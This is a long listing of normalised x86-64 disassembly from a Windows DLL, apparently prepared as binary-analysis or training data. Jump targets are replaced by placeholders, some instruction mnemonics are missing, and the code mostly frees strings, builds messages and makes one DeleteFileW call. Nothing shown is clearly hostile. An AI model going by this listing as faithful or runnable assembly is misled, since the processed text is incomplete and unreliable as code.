mov [ rbp + 0x5e0 ] 0x7
mov [ rbp + 0x5d8 ] rdi
mov [ rbp + 0x5c8 ] di
cmp [ rbp + 0x658 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x5c8 ]
call j_sub_18002094c#2
mov [ rbp + 0x478 ] 0x7
mov [ rbp + 0x470 ] rdi
mov [ rbp + 0x460 ] di
cmp [ rbp + 0x748 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x460 ]
call j_sub_18002094c#2
mov [ rbp + 0x428 ] 0x7
mov [ rbp + 0x420 ] rdi
mov [ rbp + 0x410 ] di
cmp [ rbp + 0x1f8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x410 ]
call j_sub_18002094c#2
mov [ rbp + 0x5b8 ] 0x7
mov [ rbp + 0x5b0 ] rdi
mov [ rbp + 0x5a0 ] di
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x5a0 ]
call j_sub_18002094c#2
mov [ rbp + 0x590 ] 0x7
mov [ rbp + 0x588 ] rdi
mov [ rbp + 0x578 ] di
cmp [ rbp + 0x608 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x578 ]
call j_sub_18002094c#2
mov [ rbp + 0x658 ] 0x7
mov [ rbp + 0x650 ] rdi
mov [ rbp + 0x640 ] di
cmp [ rbp + 0x608 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x640 ]
call j_sub_18002094c#2
mov [ rbp + 0x748 ] 0x7
mov [ rbp + 0x740 ] rdi
mov [ rbp + 0x730 ] di
cmp [ rbp + 0x310 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x730 ]
call j_sub_18002094c#2
mov [ rbp + 0x1f8 ] 0x7
mov [ rbp + 0x1f0 ] rdi
mov [ rbp + 0x1e0 ] di
cmp [ rbp + 0x220 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1e0 ]
call j_sub_18002094c#2
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
mov rdi [ rsp + 0x58 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov [ rbp + 0x608 ] 0x7
mov [ rbp + 0x600 ] rdi
mov [ rbp + 0x5f0 ] di
cmp [ rbp + 0x658 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x5f0 ]
call j_sub_18002094c#2
mov [ rbp + 0x608 ] 0x7
mov [ rbp + 0x600 ] rdi
mov [ rbp + 0x5f0 ] di
cmp [ rbp + 0x590 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x5f0 ]
call j_sub_18002094c#2
mov [ rbp + 0x310 ] 0x7
mov [ rbp + 0x308 ] rdi
mov [ rbp + 0x2f8 ] di
cmp [ rbp + 0x5b8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2f8 ]
call j_sub_18002094c#2
lea rdx [ r--data ]
mov rcx [ rsp + 0x58 ]
call sub_1800076c0
test al al
je r-xdata
mov rcx [ rbp + 0x208 ]
call j_sub_18002094c#2
mov [ rdi + 0x18 ] 0x7
xor eax eax
mov [ rdi + 0x10 ] rax
mov [ rdi ] ax
jmp r-xdata
mov rcx [ rdi ]
call j_sub_18002094c#2
mov [ rbp + 0x658 ] 0x7
mov [ rbp + 0x650 ] rdi
mov [ rbp + 0x640 ] di
cmp [ rbp + 0x5e0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x640 ]
call j_sub_18002094c#2
mov [ rbp + 0x590 ] 0x7
mov [ rbp + 0x588 ] rdi
mov [ rbp + 0x578 ] di
cmp [ rbp + 0x568 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x578 ]
call j_sub_18002094c#2
mov [ rbp + 0x5b8 ] 0x7
mov [ rbp + 0x5b0 ] rdi
mov [ rbp + 0x5a0 ] di
xor r8d r8d
mov dl 0x1
mov rcx rbx
call sub_180001190
nop
xor r8d r8d
mov dl 0x1
mov rcx [ rsp + 0x58 ]
call sub_180001190
mov rcx [ rbp + 0x5a0 ]
call j_sub_18002094c#2
lea rax [ rbp + 0x410 ]
mov [ rsp + 0x40 ] rax
mov rdx [ rsp + 0x58 ]
lea rcx [ rbp + 0x410 ]
call sub_180002200
mov rdi rax
mov [ rbp + 0x2c0 ] 0x7
xor eax eax
mov [ rbp + 0x2b8 ] rax
mov [ rbp + 0x2a8 ] ax
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x6b8 ]
lea rcx [ rbp + 0x2a8 ]
call sub_180001ba0
nop
movzx eax [ rbp + 0x840 ]
mov [ rsp + 0x20 ] al
movzx r9d [ rsp + 0x30 ]
mov r8 rdi
lea rdx [ rbp + 0x2a8 ]
mov rcx rsi
call sub_1800191b0
mov rdi [ rsp + 0x60 ]
mov [ rbp + 0x220 ] 0x7
mov [ rbp + 0x218 ] rdi
mov [ rbp + 0x208 ] di
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp - 0x44 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp - 0x44 ]
lea rcx [ rbp + 0x208 ]
call sub_180003930
nop
mov [ rbp + 0x2e8 ] 0x7
xor edi edi
mov [ rbp + 0x2e0 ] rdi
mov [ rbp + 0x2d0 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x2d0 ]
call sub_180003930
nop
movzx eax [ rsp + 0x7a ]
movd xmm1 eax
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x348 ]
call sub_180018950
mov [ rsp + 0x48 ] rax
mov [ rbp + 0x248 ] 0x7
mov [ rbp + 0x240 ] rdi
mov [ rbp + 0x230 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x230 ]
call sub_180003930
nop
movzx ecx [ rsp + 0x78 ]
movd xmm1 ecx
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x488 ]
call sub_180018950
mov [ rsp + 0x40 ] rax
mov [ rbp + 0x270 ] 0x7
mov [ rbp + 0x268 ] rdi
mov [ rbp + 0x258 ] di
lea r8d [ rdi + 0xa ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x258 ]
call sub_180003930
nop
movzx ecx [ rsp + 0x70 ]
movd xmm1 ecx
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x6e0 ]
call sub_180018950
mov rsi rax
mov [ rbp + 0x298 ] 0x7
mov [ rbp + 0x290 ] rdi
mov [ rbp + 0x280 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x280 ]
call sub_180003930
nop
movzx ecx [ rsp + 0x72 ]
movd xmm1 ecx
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x690 ]
call sub_180018950
mov rbx rax
mov [ rbp + 0x1f8 ] 0x7
mov [ rbp + 0x1f0 ] rdi
mov [ rbp + 0x1e0 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x1e0 ]
call sub_180003930
nop
movzx ecx [ rsp + 0x76 ]
movd xmm1 ecx
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x4b0 ]
call sub_180018950
mov rdi rax
mov edx [ rbp - 0x50 ]
lea rcx [ rbp + 0x528 ]
call sub_1800188b0
nop
mov r8 rax
lea rdx [ rbp + 0x730 ]
lea rcx [ rbp + 0x618 ]
call sub_1800089c0
nop
lea r8 [ rbp + 0x460 ]
mov rdx rax
lea rcx [ rbp + 0x668 ]
call sub_180008960
nop
mov r8 rdi
mov rdx rax
lea rcx [ rbp + 0x5c8 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x1e0 ]
mov rdx rax
lea rcx [ rbp + 0x640 ]
call sub_180018c70
nop
mov r8 rbx
mov rdx rax
lea rcx [ rbp + 0x5f0 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x280 ]
mov rdx rax
lea rcx [ rbp + 0x578 ]
call sub_180018c70
nop
mov r8 rsi
mov rdx rax
lea rcx [ rbp + 0x550 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x258 ]
mov rdx rax
lea rcx [ rbp + 0x4d8 ]
call sub_180018c70
nop
mov r8 [ rsp + 0x40 ]
mov rdx rax
lea rcx [ rbp + 0x500 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x230 ]
mov rdx rax
lea rcx [ rbp + 0x438 ]
call sub_180018c70
nop
mov r8 [ rsp + 0x48 ]
mov rdx rax
lea rcx [ rbp + 0x3e8 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x460 ]
mov rdx rax
lea rcx [ rbp + 0x370 ]
call sub_180008960
nop
mov rbx [ rsp + 0x50 ]
mov r8 rbx
mov rdx rax
lea rcx [ rbp + 0x3c0 ]
call sub_180008960
nop
lea r8 [ rbp + 0x2d0 ]
mov rdx rax
lea rcx [ rbp + 0x398 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x208 ]
mov rdx rax
lea rcx [ rbp + 0x320 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x460 ]
mov rdx rax
lea rcx [ rbp + 0x410 ]
call sub_180008960
nop
lea r8 [ rbp + 0x708 ]
mov rdx rax
lea rcx [ rbp + 0x2a8 ]
call sub_180008960
nop
mov rdx rax
lea rcx [ rbp + 0x2f8 ]
call sub_180003cb0
nop
cmp [ rbp + 0x2c0 ] 0x8
jb r-xdata
mov al 0x1
mov rcx [ rbp + 0x7e0 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x8f8
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov [ rbp + 0x5e0 ] 0x7
mov [ rbp + 0x5d8 ] rdi
mov [ rbp + 0x5c8 ] di
cmp [ rbp + 0x680 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x5c8 ]
call j_sub_18002094c#2
mov [ rbp + 0x568 ] 0x7
mov [ rbp + 0x560 ] rdi
mov [ rbp + 0x550 ] di
cmp [ rbp + 0x4f0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x550 ]
call j_sub_18002094c#2
mov [ rbp + 0x2c0 ] 0x7
xor edi edi
mov [ rbp + 0x2b8 ] rdi
mov [ rbp + 0x2a8 ] di
cmp [ rbp + 0x428 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2a8 ]
call j_sub_18002094c#2
mov [ rbp + 0x680 ] 0x7
mov [ rbp + 0x678 ] rdi
mov [ rbp + 0x668 ] di
cmp [ rbp + 0x630 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x668 ]
call j_sub_18002094c#2
mov [ rbp + 0x4f0 ] 0x7
mov [ rbp + 0x4e8 ] rdi
mov [ rbp + 0x4d8 ] di
cmp [ rbp + 0x518 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4d8 ]
call j_sub_18002094c#2
mov [ rbp + 0x428 ] 0x7
mov [ rbp + 0x420 ] rdi
mov [ rbp + 0x410 ] di
cmp [ rbp + 0x338 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x410 ]
call j_sub_18002094c#2
mov [ rbp + 0x630 ] 0x7
mov [ rbp + 0x628 ] rdi
mov [ rbp + 0x618 ] di
cmp [ rbp + 0x540 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x618 ]
call j_sub_18002094c#2
mov [ rbp + 0x518 ] 0x7
mov [ rbp + 0x510 ] rdi
mov [ rbp + 0x500 ] di
cmp [ rbp + 0x450 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x500 ]
call j_sub_18002094c#2
mov [ rbp + 0x338 ] 0x7
mov [ rbp + 0x330 ] rdi
mov [ rbp + 0x320 ] di
cmp [ rbp + 0x3b0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x320 ]
call j_sub_18002094c#2
mov [ rbp + 0x540 ] 0x7
mov [ rbp + 0x538 ] rdi
mov [ rbp + 0x528 ] di
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x528 ]
call j_sub_18002094c#2
mov [ rbp + 0x450 ] 0x7
mov [ rbp + 0x448 ] rdi
mov [ rbp + 0x438 ] di
cmp [ rbp + 0x400 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x438 ]
call j_sub_18002094c#2
mov [ rbp + 0x3b0 ] 0x7
mov [ rbp + 0x3a8 ] rdi
mov [ rbp + 0x398 ] di
cmp [ rbp + 0x3d8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x398 ]
call j_sub_18002094c#2
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] rdi
mov [ rbp + 0x4b0 ] di
cmp [ rbp + 0x6a8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
mov [ rbp + 0x400 ] 0x7
mov [ rbp + 0x3f8 ] rdi
mov [ rbp + 0x3e8 ] di
cmp [ rbp + 0x360 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x3e8 ]
call j_sub_18002094c#2
mov [ rbp + 0x3d8 ] 0x7
mov [ rbp + 0x3d0 ] rdi
mov [ rbp + 0x3c0 ] di
cmp [ rbp + 0x388 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x3c0 ]
call j_sub_18002094c#2
mov [ rbp + 0x6a8 ] 0x7
mov [ rbp + 0x6a0 ] rdi
mov [ rbp + 0x690 ] di
cmp [ rbp + 0x6f8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x690 ]
call j_sub_18002094c#2
mov [ rbp + 0x360 ] 0x7
mov [ rbp + 0x358 ] rdi
mov [ rbp + 0x348 ] di
cmp [ rbp + 0x388 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x348 ]
call j_sub_18002094c#2
mov [ rbp + 0x388 ] 0x7
mov [ rbp + 0x380 ] rdi
mov [ rbp + 0x370 ] di
cmp [ rbp + 0x400 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x370 ]
call j_sub_18002094c#2
mov [ rbp + 0x6f8 ] 0x7
mov [ rbp + 0x6f0 ] rdi
mov [ rbp + 0x6e0 ] di
cmp [ rbp + 0x1f8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x6e0 ]
call j_sub_18002094c#2
mov [ rbp + 0x388 ] 0x7
mov [ rbp + 0x380 ] rdi
mov [ rbp + 0x370 ] di
cmp [ rbp + 0x2e8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x370 ]
call j_sub_18002094c#2
mov [ rbp + 0x400 ] 0x7
mov [ rbp + 0x3f8 ] rdi
mov [ rbp + 0x3e8 ] di
cmp [ rbp + 0x450 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x3e8 ]
call j_sub_18002094c#2
mov [ rbp + 0x1f8 ] 0x7
mov [ rbp + 0x1f0 ] rdi
mov [ rbp + 0x1e0 ] di
cmp [ rbp + 0x4a0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1e0 ]
call j_sub_18002094c#2
mov [ rbp + 0x2e8 ] 0x7
mov [ rbp + 0x2e0 ] rdi
mov [ rbp + 0x2d0 ] di
cmp [ rbp + 0x3d8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2d0 ]
call j_sub_18002094c#2
mov [ rbp + 0x450 ] 0x7
mov [ rbp + 0x448 ] rdi
mov [ rbp + 0x438 ] di
cmp [ rbp + 0x518 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x438 ]
call j_sub_18002094c#2
mov [ rbp + 0x4a0 ] 0x7
mov [ rbp + 0x498 ] rdi
mov [ rbp + 0x488 ] di
cmp [ rbp + 0x298 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x488 ]
call j_sub_18002094c#2
mov [ rbp + 0x3d8 ] 0x7
mov [ rbp + 0x3d0 ] rdi
mov [ rbp + 0x3c0 ] di
cmp [ rbp + 0x248 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x3c0 ]
call j_sub_18002094c#2
mov [ rbp + 0x518 ] 0x7
mov [ rbp + 0x510 ] rdi
mov [ rbp + 0x500 ] di
cmp [ rbp + 0x4f0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x500 ]
call j_sub_18002094c#2
mov [ rbp + 0x298 ] 0x7
mov [ rbp + 0x290 ] rdi
mov [ rbp + 0x280 ] di
cmp [ rbp + 0x360 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x280 ]
call j_sub_18002094c#2
mov [ rbp + 0x248 ] 0x7
mov [ rbp + 0x240 ] rdi
mov [ rbp + 0x230 ] di
cmp [ rbp + 0x3b0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x230 ]
call j_sub_18002094c#2
mov [ rbp + 0x4f0 ] 0x7
mov [ rbp + 0x4e8 ] rdi
mov [ rbp + 0x4d8 ] di
cmp [ rbp + 0x568 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4d8 ]
call j_sub_18002094c#2
mov [ rbp + 0x360 ] 0x7
mov [ rbp + 0x358 ] rdi
mov [ rbp + 0x348 ] di
cmp [ rbp + 0x270 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x348 ]
call j_sub_18002094c#2
mov [ rbp + 0x3b0 ] 0x7
mov [ rbp + 0x3a8 ] rdi
mov [ rbp + 0x398 ] di
cmp [ rbp + 0x270 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x398 ]
call j_sub_18002094c#2
mov [ rbp + 0x568 ] 0x7
mov [ rbp + 0x560 ] rdi
mov [ rbp + 0x550 ] di
cmp [ rbp + 0x590 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x550 ]
call j_sub_18002094c#2
mov [ rbp + 0x270 ] 0x7
mov [ rbp + 0x268 ] rdi
mov [ rbp + 0x258 ] di
cmp [ rbp + 0x428 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x258 ]
call j_sub_18002094c#2
mov [ rbp + 0x270 ] 0x7
mov [ rbp + 0x268 ] rdi
mov [ rbp + 0x258 ] di
cmp [ rbp + 0x338 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x258 ]
call j_sub_18002094c#2
mov [ rbp + 0x590 ] 0x7
mov [ rbp + 0x588 ] rdi
mov [ rbp + 0x578 ] di
cmp [ rbp + 0x608 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x578 ]
call j_sub_18002094c#2
mov [ rbp + 0x428 ] 0x7
mov [ rbp + 0x420 ] rdi
mov [ rbp + 0x410 ] di
cmp [ rbp + 0x248 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x410 ]
call j_sub_18002094c#2
mov [ rbp + 0x338 ] 0x7
mov [ rbp + 0x330 ] rdi
mov [ rbp + 0x320 ] di
cmp [ rbp + 0x298 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x320 ]
call j_sub_18002094c#2
mov [ rbp + 0x608 ] 0x7
mov [ rbp + 0x600 ] rdi
mov [ rbp + 0x5f0 ] di
cmp [ rbp + 0x658 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x5f0 ]
call j_sub_18002094c#2
mov [ rbp + 0x248 ] 0x7
mov [ rbp + 0x240 ] rdi
mov [ rbp + 0x230 ] di
cmp [ rbp + 0x2c0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x230 ]
call j_sub_18002094c#2
mov [ rbp + 0x298 ] 0x7
mov [ rbp + 0x290 ] rdi
mov [ rbp + 0x280 ] di
cmp [ rbp + 0x1f8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x280 ]
call j_sub_18002094c#2
mov [ rbp + 0x658 ] 0x7
mov [ rbp + 0x650 ] rdi
mov [ rbp + 0x640 ] di
cmp [ rbp + 0x5e0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x640 ]
call j_sub_18002094c#2
mov [ rbp + 0x2c0 ] 0x7
mov [ rbp + 0x2b8 ] rdi
mov [ rbp + 0x2a8 ] di
cmp [ rbp + 0x2e8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2a8 ]
call j_sub_18002094c#2
movzx ecx [ rbp + 0x840 ]
dec ecx
je r-xdata
mov rcx [ rbp + 0x1e0 ]
call j_sub_18002094c#2
mov [ rbp + 0x5e0 ] 0x7
mov [ rbp + 0x5d8 ] rdi
mov [ rbp + 0x5c8 ] di
cmp [ rbp + 0x680 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x5c8 ]
call j_sub_18002094c#2
mov [ rbp + 0x2e8 ] 0x7
mov [ rbp + 0x2e0 ] rdi
mov [ rbp + 0x2d0 ] di
cmp [ rbp + 0x220 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2d0 ]
call j_sub_18002094c#2
lea rax [ rbp + 0x668 ]
mov [ rsp + 0x40 ] rax
mov [ rbp + 0x680 ] 0x7
mov [ rbp + 0x678 ] rdi
mov [ rbp + 0x668 ] di
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp - 0x44 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp - 0x44 ]
lea rcx [ rbp + 0x668 ]
call sub_180003930
nop
mov [ rbp + 0x2c0 ] 0x7
xor edi edi
mov [ rbp + 0x2b8 ] rdi
mov [ rbp + 0x2a8 ] di
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbx
lea rcx [ rbp + 0x2a8 ]
call sub_180001ba0
nop
lea r8 [ rbp + 0x668 ]
lea rdx [ rbp + 0x2a8 ]
mov rsi [ rsp + 0x38 ]
mov rcx rsi
call sub_180018d70
cmp eax 0x1
jne r-xdata
dec ecx
je r-xdata
mov [ rbp + 0x680 ] 0x7
mov [ rbp + 0x678 ] rdi
mov [ rbp + 0x668 ] di
cmp [ rbp + 0x630 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x668 ]
call j_sub_18002094c#2
mov rsi [ rsp + 0x38 ]
mov rcx [ rbp + 0x208 ]
call j_sub_18002094c#2
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edx eax
lea rcx [ rbp + 0x690 ]
call sub_1800188b0
mov rdi rax
mov [ rbp + 0x1f8 ] 0x7
xor eax eax
mov [ rbp + 0x1f0 ] rax
mov [ rbp + 0x1e0 ] ax
lea r8d [ rax + 0x14 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x1e0 ]
call sub_180003930
nop
lea r8 [ rbp + 0x1e0 ]
lea rdx [ rbp + 0x460 ]
lea rcx [ rbp + 0x528 ]
call sub_1800089c0
nop
mov r8 rdi
mov rdx rax
lea rcx [ rbp + 0x618 ]
call sub_180018c70
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x2f8 ]
call sub_180008240
nop
cmp [ rbp + 0x630 ] 0x8
jb r-xdata
mov [ rbp + 0x2e8 ] 0x7
mov [ rbp + 0x2e0 ] rdi
mov [ rbp + 0x2d0 ] di
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rbp + 0x2d0 ]
call sub_180003930
nop
lea r8 [ rbp + 0x2d0 ]
mov rdx rbx
lea rcx [ rbp + 0x578 ]
call sub_1800089c0
nop
lea r8 [ rbp - 0x44 ]
mov rdx rax
lea rcx [ rbp + 0x550 ]
call sub_180018d00
nop
mov rdx rax
lea rcx [ rbp + 0x5a0 ]
call sub_180003cb0
nop
cmp [ rbp + 0x568 ] 0x8
jb r-xdata
dec ecx
je r-xdata
mov [ rbp + 0x630 ] 0x7
mov [ rbp + 0x628 ] rdi
mov [ rbp + 0x618 ] di
cmp [ rbp + 0x540 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x618 ]
call j_sub_18002094c#2
mov [ rbp + 0x220 ] 0x7
mov [ rbp + 0x218 ] rdi
mov [ rbp + 0x208 ] di
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rbp + 0x208 ]
call sub_180003930
nop
lea r8 [ rbp + 0x208 ]
lea rdx [ rbp + 0x708 ]
lea rcx [ rbp + 0x320 ]
call sub_1800089c0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x2f8 ]
call sub_180008240
nop
cmp [ rbp + 0x338 ] 0x8
jb r-xdata
mov [ rbp + 0x220 ] 0x7
mov [ rbp + 0x218 ] rdi
mov [ rbp + 0x208 ] di
lea r8d [ rax + 0x7 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x208 ]
call sub_180003930
nop
lea r8 [ rbp + 0x208 ]
lea rdx [ rbp + 0x460 ]
lea rcx [ rbp + 0x4b0 ]
call sub_1800089c0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x2f8 ]
call sub_180008240
nop
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov [ rbp + 0x630 ] 0x7
xor edi edi
mov [ rbp + 0x628 ] rdi
mov [ rbp + 0x618 ] di
cmp [ rbp + 0x540 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x618 ]
call j_sub_18002094c#2
mov [ rbp + 0x568 ] 0x7
mov [ rbp + 0x560 ] rdi
mov [ rbp + 0x550 ] di
cmp [ rbp + 0x590 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x550 ]
call j_sub_18002094c#2
mov [ rbp + 0x298 ] 0x7
mov [ rbp + 0x290 ] rdi
mov [ rbp + 0x280 ] di
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rbp + 0x280 ]
call sub_180003930
nop
lea r8 [ rbp + 0x280 ]
mov rdx rbx
lea rcx [ rbp + 0x398 ]
call sub_1800089c0
nop
lea r8 [ rbp - 0x44 ]
mov rdx rax
lea rcx [ rbp + 0x320 ]
call sub_180018d00
nop
mov rdx rax
lea rcx [ rbp + 0x5a0 ]
call sub_180003cb0
nop
cmp [ rbp + 0x338 ] 0x8
jb r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x460 ]
lea rcx [ rbp + 0x2f8 ]
call sub_180008240
mov [ rbp + 0x540 ] 0x7
mov [ rbp + 0x538 ] rdi
mov [ rbp + 0x528 ] di
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x528 ]
call j_sub_18002094c#2
mov [ rbp + 0x338 ] 0x7
mov [ rbp + 0x330 ] rdi
mov [ rbp + 0x320 ] di
cmp [ rbp + 0x220 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x320 ]
call j_sub_18002094c#2
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] rdi
mov [ rbp + 0x4b0 ] di
cmp [ rbp + 0x220 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
mov [ rbp + 0x540 ] 0x7
mov [ rbp + 0x538 ] rdi
mov [ rbp + 0x528 ] di
cmp [ rbp + 0x1f8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x528 ]
call j_sub_18002094c#2
mov [ rbp + 0x590 ] 0x7
mov [ rbp + 0x588 ] rdi
mov [ rbp + 0x578 ] di
cmp [ rbp + 0x2e8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x578 ]
call j_sub_18002094c#2
mov [ rbp + 0x338 ] 0x7
mov [ rbp + 0x330 ] rdi
mov [ rbp + 0x320 ] di
cmp [ rbp + 0x3b0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x320 ]
call j_sub_18002094c#2
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] rdi
mov [ rbp + 0x4b0 ] di
cmp [ rbp + 0x1f8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x2f8 ]
lea rcx [ rsi + 0x10 ]
call sub_180008240
mov rdi [ rsp + 0x60 ]
mov rcx [ rbp + 0x208 ]
call j_sub_18002094c#2
jmp r-xdata
mov rcx [ rbp + 0x208 ]
call j_sub_18002094c#2
jmp r-xdata
mov [ rbp + 0x1f8 ] 0x7
mov [ rbp + 0x1f0 ] rdi
mov [ rbp + 0x1e0 ] di
cmp [ rbp + 0x6a8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1e0 ]
call j_sub_18002094c#2
mov [ rbp + 0x2e8 ] 0x7
mov [ rbp + 0x2e0 ] rdi
mov [ rbp + 0x2d0 ] di
lea rcx [ rbp + 0x5a0 ]
cmp [ rbp + 0x5b8 ] 0x8
cmovae rcx [ rbp + 0x5a0 ]
call [ DeleteFileW@IAT ]
test eax eax
setne al
test al al
jne r-xdata
mov rcx [ rbp + 0x2d0 ]
call j_sub_18002094c#2
mov [ rbp + 0x3b0 ] 0x7
mov [ rbp + 0x3a8 ] rdi
mov [ rbp + 0x398 ] di
cmp [ rbp + 0x298 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x398 ]
call j_sub_18002094c#2
mov [ rbp + 0x1f8 ] 0x7
mov [ rbp + 0x1f0 ] rdi
mov [ rbp + 0x1e0 ] di
cmp [ rbp + 0x6a8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1e0 ]
call j_sub_18002094c#2
mov rcx [ rbp + 0x690 ]
call j_sub_18002094c#2
jmp r-xdata
mov [ rbp + 0x4a0 ] 0x7
mov [ rbp + 0x498 ] rdi
mov [ rbp + 0x488 ] di
mov r8d 0x7
lea rdx [ r--data ]
lea rcx [ rbp + 0x488 ]
call sub_180003930
nop
lea r8 [ rbp + 0x488 ]
lea rdx [ rbp + 0x460 ]
lea rcx [ rbp + 0x5c8 ]
call sub_1800089c0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rbp + 0x2f8 ]
call sub_180008240
nop
cmp [ rbp + 0x5e0 ] 0x8
jb r-xdata
call [ GetLastError@IAT ]
mov edx eax
lea rcx [ rbp + 0x410 ]
call sub_1800188b0
mov rdi rax
mov [ rbp + 0x360 ] 0x7
xor eax eax
mov [ rbp + 0x358 ] rax
